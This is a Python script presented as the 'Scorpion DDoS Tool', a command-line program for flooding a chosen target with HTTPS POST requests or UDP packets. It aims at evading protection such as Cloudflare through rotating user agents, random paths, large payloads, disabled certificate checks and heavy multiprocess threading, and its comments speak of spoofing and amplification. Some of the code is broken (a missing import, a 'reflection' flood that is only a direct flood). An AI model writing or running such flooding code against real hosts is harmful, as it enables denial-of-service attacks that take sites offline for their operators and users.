import argparse
import socket
import threading
import random
import ssl
import multiprocessing
from itertools import cycle
import time

# Help documentation via argparse
def setup_argparse():
    parser = argparse.ArgumentParser(
        description="Scorpion DDoS Tool: A network stress tester for HTTP and UDP floods."
    )
    parser.add_argument('-t', '--target', type=str, required=True, help="Target website or IP address")
    parser.add_argument('-p', '--port', type=int, default=443, help="Port to attack (default: 443 for HTTPS)")
    parser.add_argument('-th', '--threads', type=int, default=1000, help="Number of threads (default: 1000)")
    parser.add_argument('-f', '--flood-type', choices=['http', 'udp'], default='http',
                        help="Flood type: 'http' for Layer 7 HTTP flood, 'udp' for UDP reflection flood")
    parser.add_argument('-m', '--mode', choices=['http', 'udp'], default='http',
                        help="Mode: choose 'http' for HTTP flood or 'udp' for UDP reflection")
    return parser.parse_args()

# Randomized headers to simulate diverse traffic
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1"
]

# Paths for randomness
paths = ["/", "/login", "/contact", "/about", "/search?q=random" + str(random.randint(1, 1000))]

# Large payload for HTTP flood
large_payload = "A" * 10000  # Large body content to increase the packet size

# UDP Reflection amplification packet
amplified_packet_data = b'\x00' * 1024  # 1KB UDP packet for flood

# UDP Reflection to boost the attack power (use for IP spoofing and amplification attacks)
def udp_reflection_flood(target_ip, port, packets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(packets):
        try:
            sock.sendto(amplified_packet_data, (target_ip, port))
        except Exception:
            pass

# Persistent large HTTP packet flood
def cloudflare_flood(target, port, threads):
    context = ssl._create_unverified_context()  # Bypass SSL verification
    ua_cycle = cycle(user_agents)  # Cycle through user-agents
    path_cycle = cycle(paths)  # Cycle through different paths

    def flood():
        while True:
            try:
                conn = http.client.HTTPSConnection(target, port, context=context, timeout=5)
                path = next(path_cycle)  # Randomized path
                headers = {
                    "User-Agent": next(ua_cycle),
                    "Accept": "*/*",
                    "Connection": "keep-alive",  # Keep the connection open to send multiple packets
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                conn.request("POST", path, body=large_payload, headers=headers)
                response = conn.getresponse()
                conn.close()
            except Exception:
                pass  # Handle errors silently to continue flooding

    # Create threads within each process for high concurrency
    def run_thread_flood(thread_count):
        for _ in range(thread_count):
            thread = threading.Thread(target=flood)
            thread.daemon = True
            thread.start()

        while True:
            time.sleep(0.1)

    # Distribute the flood across multiple processes
    def run_flood_multiprocessing(threads):
        num_processes = multiprocessing.cpu_count() * 2  # Utilize multiple CPU cores
        thread_count_per_process = threads // num_processes

        processes = []
        for _ in range(num_processes):
            process = multiprocessing.Process(target=run_thread_flood, args=(thread_count_per_process,))
            process.daemon = True
            process.start()
            processes.append(process)

        for process in processes:
            process.join()

    run_flood_multiprocessing(threads)

def start_attack(args):
    if args.flood_type == 'udp':
        print(f"[INFO] Starting UDP flood on {args.target}:{args.port} with {args.threads} threads...")
        threading.Thread(target=udp_reflection_flood, args=(args.target, args.port, 1000000)).start()
    elif args.flood_type == 'http':
        print(f"[INFO] Starting HTTP flood on {args.target}:{args.port} with {args.threads} threads...")
        cloudflare_flood(args.target, args.port, args.threads)

if __name__ == "__main__":
    args = setup_argparse()
    start_attack(args)
